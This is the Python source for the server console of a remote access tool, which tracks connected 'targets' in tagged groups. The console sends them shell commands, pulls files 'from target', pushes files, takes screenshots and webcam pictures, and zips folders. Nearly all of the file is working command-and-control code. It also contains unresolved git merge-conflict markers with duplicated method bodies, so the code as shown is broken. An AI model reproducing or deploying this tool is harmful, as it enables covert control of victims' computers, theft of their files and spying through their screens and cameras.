#!/usr/bin/env python3
# standard python libraries
import sys
import base64
import socket
import json
from threading import Thread
# non-standard libraries
import texttable


class Server:
    def __init__(self):
        self.timeout = 30
        self.zip_compression_level = 0
        self.camera_port = 0
        self.connection = Connection()

        while True:
            entered = input(">> ")
            if entered:
                command = entered[0].lower()
                attribute = entered[2:].split(" @ ")

                if command == "h":
                    self.print_help()
                elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["timeout", "zip_compression", "camera_port"]:
                    self.set_option(attribute[0].split()[0].lower(), attribute[0].split()[1])
                elif command == "l" and len(attribute):
                    self.generate_texttable(self.get_conn_fgoi(attribute[0].split()))
                elif command == "t" and len(attribute) == 2:
                    self.change_tag(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                elif command == "r" and len(attribute):
                    self.remove_connection(self.get_conn_fgoi(attribute[0].split()))
                elif command == "g" and len(attribute) == 2 and attribute[0].split()[0].lower() in ["add", "rm"]:
                    self.edit_group(attribute[0].split()[0].lower(), self.get_conn_fgoi(attribute[0].split()[0:]), attribute[1].split())
                elif command == "f" and len(attribute) == 2 and attribute[0].split()[0] in ["set", "get"]:
                    if attribute[0].split()[0] == "set":
                        if len(attribute[0].split()) == 2:
                            self.cwd(attribute[0].split()[0], attribute[0].split()[1], self.get_conn_fgoi(attribute[1].split()))
                        else:
                            print("[-] InvalidInputError")
                    elif attribute[0].split()[0] == "get":
                        if len(attribute[0].split()) == 1:
                            self.cwd(attribute[0].split()[0], "", self.get_conn_fgoi(attribute[1].split()))
                        else:
                            print("[-] InvalidInputError")
                elif command == "c" and len(attribute) == 2:
                    self.execute_command(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                elif command == "d" and len(attribute) == 3:
                    self.download_file(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                elif command == "u" and len(attribute) == 3:
                    self.upload_file(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                elif command == "s" and len(attribute) == 2 and len(attribute[0].split()) == 2:
                    self.make_screenshot(attribute[0].split()[0], attribute[0].split()[1], self.get_conn_fgoi(attribute[1].split()))
                elif command == "z" and len(attribute) == 3:
                    self.zip_file_or_folder(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                elif command == "w" and len(attribute) == 2:
                    self.capture_camera_picture(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                elif command == "x":
                    self.connection.sock.close()
                    break
                else:
                    print("[-] InvalidInputError")
            else:
                print("[-] InvalidInputError")

    def print_help(self):
        print("h show this page")
        print("o [timeout/zip_compression/camera_port] [value] set option")
        print("l [clients] list clients")
        print("t [tag] @ [clients] change tag")
        print("r [clients] close and remove connection")
        print("g [add/rm] [clients] @ [group name] change group")
        print("f [set/get] [path] @ [clients] set or get current working directory")
        print("c [command] @ [clients]  execute console command")
        print("d [path to open] @ [path to save] @ [clients] download file from target")
        print("u [path to open] @ [path to save] @ [clients] upload file to target")
        print("s [monitor] [path_to_save] @ [clients] capture screenshot")
        print("z [path_to_open] @ [path_to_save] @ [clients] zip file or folder")
        print("w [path_to_save] @ [clients] capture camera picture")
        print("x exit server")

    def generate_texttable(self, connections):
        table = texttable.Texttable()
        table.set_deco(texttable.Texttable.HEADER)
        rows = [["INDEX", "ADDRESS", "PORT", "TAG", "GROUPS"]]
        for index, session in enumerate(self.connection.sessions):
            if session["connection"] in connections:
                rows.append([index, session["address"], session["port"], session["tag"], ", ".join(session["groups"])])
        table.add_rows(rows)
        print(table.draw())

    def set_option(self, option, value):
        option = option.lower()
        if option == "timeout":
            try:
                self.timeout = int(value)
            except ValueError:
                print("[-] InvalidTimeout")
        elif option == "zip_compression":
            try:
                if int(value) not in range(10):
                    print("[-] InvalidCompressionLevel")
                else:
                    self.zip_compression_level = int(value)
            except ValueError:
                print("[-] InvalidCompressionLevel")
        elif option == "camera_port":
            try:
                if not int(value) < 0:
                    print("[-] InvalidCameraPort")
                else:
                    self.camera_port = int(value)
            except ValueError:
                print("[-] InvalidCameraPort")
        else:
            print("[-] UnknownOption")

    def change_tag(self, tag, connections):
        for index, session in enumerate(self.connection.sessions):
            if session["connection"] in connections:
                self.connection.sessions[index]["tag"] = tag

    def remove_connection(self, connections):
        request = {"cmd": "r",
                   "timeout": self.timeout}
        for session in list(self.connection.sessions):
            if session["connection"] in connections:
                try:
                    self.connection.send(self.enc_request(request), session["connection"])
                except socket.error:
                    pass
                session["connection"].close()
                self.connection.sessions.remove(session)

    def edit_group(self, mode, connections, group_names):
        if mode == "add":
            for index, session in enumerate(self.connection.sessions):
                if session["connection"] in connections:
                    for name in group_names:
                        if name not in self.connection.sessions[index]["groups"]:
                            self.connection.sessions[index]["groups"].append(name)
                        else:
                            print("[-] TargetAlreadyInGroup")

        elif mode == "rm":
            for index, session in enumerate(self.connection.sessions):
                if session["connection"] in connections:
                    for name in group_names:
                        try:
                            self.connection.sessions[index]["groups"].remove(name)
                        except ValueError:
                            print("[-] TargetNotInGroup")

    def cwd(self, mode, path, connections):
        request = {"cmd": "f",
                   "mode": mode,
                   "path": path,
                   "timeout": self.timeout}
<<<<<<< HEAD
        for connection in connections:
            try:
                self.connection.send(self.enc_request(request), connection)
                response = self.dec_response(self.connection.recv(connection))
                print(response["data"] + response["error"])
            except socket.error as error:
                print("SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))

    def execute_command(self, exe, connections):
        request = {"cmd": "c",
                   "exe": exe,
                   "timeout": self.timeout}
=======
>>>>>>> 72693f10253976fdf0d943334d45ed54c4cc40cb
        for connection in connections:
            try:
                self.connection.send(self.enc_request(request), connection)
                response = self.dec_response(self.connection.recv(connection))
                print(response["data"] + response["error"])
<<<<<<< HEAD
=======
            except socket.error as error:
                self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)) + "\n")

    def execute_command(self, exe, connections):
        request = {"cmd": "c",
                   "exe": exe,
                   "timeout": self.timeout}
        for connection in connections:
            try:
                self.connection.send(self.enc_request(request), connection)
                response = self.dec_response(self.connection.recv(connection))
                print(response["data"] + response["error"])
>>>>>>> 72693f10253976fdf0d943334d45ed54c4cc40cb
            except socket.error as error:
                print("SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))

    def download_file(self, path_to_open, path_to_save, connections):
        request = {"cmd": "d",
                   "open_path": path_to_open}
        for connection in connections:
            try:
                self.connection.send(self.enc_request(request), connection)
                response = self.dec_response(self.connection.recv(connection))
                if response["error"]:
                    print(response["error"])
                else:
                    len_data_total = int(response["length"])
                    data = bytes()
                    while not data.endswith(self.connection.END_MARKER):
                        data += connection.recv(self.connection.PACKET_SIZE)
                        len_data_current = len(data)
                        self.update_line("\r[*] " + str(int(len_data_current / (len_data_total / 100))) + "% complete")
                    data = base64.b64decode(data[:-(len(self.connection.END_MARKER))])
                    with open(path_to_save, "wb") as file:
                        file.write(data)
            except socket.error as error:
                self.update_line("\rSocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
            except KeyboardInterrupt:
                self.update_line("\rDownloadCanceled")
            print()

    def upload_file(self, path_to_open, path_to_save, connections):
        request = {"cmd": "u",
                   "save_path": path_to_save}
        try:
            with open(path_to_open, "rb") as file:
                data = base64.b64encode(file.read()) + self.connection.END_MARKER
        except FileNotFoundError:
            print("[-] FileNotFoundError")
        except PermissionError:
            print("[-] PermissionError")
        else:
            for connection in connections:
                try:
                    len_data_total = len(data)
                    self.connection.send(self.enc_request(request), connection)
                    while data:
                        connection.send(data[:self.connection.PACKET_SIZE])
                        data = data[self.connection.PACKET_SIZE:]
                        len_data_current = len_data_total - len(data)
                        self.update_line("\r[*] " + str(int(len_data_current / (len_data_total / 100))) + "% complete")
                    response = self.dec_response(self.connection.recv(connection))
                    print(response["error"])
                except socket.error as error:
                    self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
                except KeyboardInterrupt:
                    self.update_line("\r[-] UploadCanceled")
                print()

    def make_screenshot(self, monitor, path_to_save, connections):
        request = {"cmd": "s",
                   "monitor": monitor,
                   "save_path": path_to_save,
                   "timeout": self.timeout}
        for connection in connections:
            try:
                self.connection.send(self.enc_request(request), connection)
                response = self.dec_response(self.connection.recv(connection))
                print(response["error"])
            except socket.error as error:
                print("SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))

    def zip_file_or_folder(self, path_to_open, path_to_save, connections):
        request = {"cmd": "z",
                   "comp_lvl": self.zip_compression_level,
                   "open_path": path_to_open,
                   "save_path": path_to_save,
                   "timeout": self.timeout}
        for connection in connections:
            try:
                self.connection.send(self.enc_request(request), connection)
                response = self.dec_response(self.connection.recv(connection))
                print(response["error"])
            except socket.error as error:
                print("SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))

    def capture_camera_picture(self, path_to_save, connections):
        request = {"cmd": "w",
                   "cam_port": self.camera_port,
                   "path_to_save": path_to_save,
                   "timeout": self.timeout}
        for connection in connections:
            try:
                self.connection.send(self.enc_request(request), connection)
                response = self.dec_response(self.connection.recv(connection))
                print(response["error"])
            except socket.error as error:
                print("SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)) + "\n")

    def get_conn_fgoi(self, objects):  # get connections from groups or indexs
        connections = list()
        for goi in objects:
            for index, session in enumerate(self.connection.sessions):
                if session["connection"] not in connections:
                    if goi in session["groups"]:
                        connections.append(session["connection"])
                    elif goi == str(index):
                        connections.append(session["connection"])
        return connections

    def get_index_by_connection(self, searched_connection):
        for index, session in enumerate(self.connection.sessions):
            if searched_connection == session["connection"]:
                return index

    def update_line(self, text):
        sys.stdout.write(text)
        sys.stdout.flush()

    def enc_request(self, request):
        return json.dumps(request).encode(self.connection.CODEC)

    def dec_response(self, response):
        return json.loads(response.decode(self.connection.CODEC))


class Connection:
    def __init__(self):
        self.CODEC = "utf8"
        self.PACKET_SIZE = 1024
        self.END_MARKER = "-".encode(self.CODEC)
        self.sessions = list()

        HOST = "127.0.0.1"
        PORT = 10001

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.sock.bind((HOST, PORT))
        print("[*] server running")
        Thread(target=self.accept_new_connections, args=(self.sock,)).start()
        print("[*] waiting for clients")

    def accept_new_connections(self, sock):
        while True:
            sock.listen()
            connection, (address, port) = sock.accept()
            session = {"connection": connection,
                       "address": address,
                       "port": port,
                       "tag": "no tag",
                       "groups": ["all"]}
            self.sessions.append(session)

    def send(self, data, connection):
        data = base64.b64encode(data) + self.END_MARKER
        connection.send(data)

    def recv(self, connection):
        data = bytes()
        while not data.endswith(self.END_MARKER):
            data += connection.recv(self.PACKET_SIZE)
        return base64.b64decode(data[:-1])


if __name__ == "__main__":
    server = Server()
